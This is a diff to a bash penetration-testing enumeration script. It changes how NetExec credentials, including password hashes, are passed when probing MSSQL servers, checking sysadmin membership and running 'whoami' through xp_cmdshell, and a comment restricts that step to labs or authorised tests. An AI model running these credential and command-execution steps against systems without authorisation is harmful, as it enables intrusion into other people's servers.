@@ -18,27 +18,20 @@ fi
 # nxc mssql
 if (have nxc || have netexec); then
     NXC=$(command -v nxc || command -v netexec)
-    NXC_ARGS=""
-    if [ -n "${ENUM_USER:-}" ]; then
-        NXC_ARGS+=" -u $ENUM_USER"
-        if [ -n "${ENUM_HASH:-}" ]; then NXC_ARGS+=" -H $ENUM_HASH"
-        elif [ -n "${ENUM_PASS:-}" ]; then NXC_ARGS+=" -p $ENUM_PASS"; fi
-        [ -n "${ENUM_DOMAIN:-}" ] && NXC_ARGS+=" -d $ENUM_DOMAIN"
-    fi
+    NXC_ARGS=()
+    nxc_creds_array NXC_ARGS
+
     log "nxc mssql (cred check + windows-auth + local-auth attempts)"
-    # shellcheck disable=SC2086
-    echo "$IPS" | $NXC mssql - $NXC_ARGS \
+    echo "$IPS" | "$NXC" mssql - "${NXC_ARGS[@]}" \
         > "$OUT/nxc_mssql.txt" 2>&1 || true
 
     if [ -n "${ENUM_USER:-}" ]; then
         log "nxc mssql -q 'SELECT @@VERSION'"
-        # shellcheck disable=SC2086
-        echo "$IPS" | $NXC mssql - $NXC_ARGS \
+        echo "$IPS" | "$NXC" mssql - "${NXC_ARGS[@]}" \
             -q 'SELECT @@VERSION; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(''sysadmin'');' \
             > "$OUT/nxc_mssql_query.txt" 2>&1 || true
         log "nxc mssql --xp_cmdshell (DO NOT run on prod — only labs/auth)"
-        # shellcheck disable=SC2086
-        echo "$IPS" | $NXC mssql - $NXC_ARGS \
+        echo "$IPS" | "$NXC" mssql - "${NXC_ARGS[@]}" \
             -x 'whoami' > "$OUT/nxc_mssql_cmd.txt" 2>&1 || true
     fi
 fi
